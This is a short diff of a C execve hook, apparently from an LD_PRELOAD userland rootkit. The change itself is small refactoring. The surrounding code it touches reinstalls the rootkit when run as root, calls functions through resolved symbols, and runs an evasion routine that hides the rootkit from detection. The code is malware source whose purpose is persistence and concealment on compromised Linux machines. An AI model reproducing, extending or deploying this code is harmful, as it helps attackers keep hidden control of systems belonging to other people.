@@ -1,7 +1,6 @@
 int execve(const char *filename, char *const argv[], char *const envp[]){
 #ifdef DO_REINSTALL
     if(!not_user(0)) reinstall();
-    int evasion_status;
 #endif
 
     /* resolve all of the symbols that we may need to use */
@@ -18,11 +17,13 @@ int execve(const char *filename, char *const argv[], char *const envp[]){
                 exit(-1);
             }
 
-            if(argv[3] != NULL) /* if we have argv[3], it should be a path, verify it exists */
+            /* if we have argv[3], it should be a path, verify it exists */
+            if(argv[3] != NULL){
                 if((long)call(CACCESS, argv[3], F_OK) < 0 && errno == ENOENT){
                     xprintf(ERR_STAT_PATH);
                     exit(-1);   /* exit with -1 if we can't stat the path */
                 }
+            }
 
             if(!argv[2]) exit(-1);
 
@@ -64,8 +65,8 @@ int execve(const char *filename, char *const argv[], char *const envp[]){
         return -1;
     }
 
-#if defined(HIDE_SELF) && defined(DO_REINSTALL)
-    evasion_status = evade(filename, argv, envp);
+#if defined(DO_REINSTALL) && defined(DO_EVASIONS)
+    int evasion_status = evade(filename, argv, envp);
     switch(evasion_status)
     {
         case VEVADE_DONE:
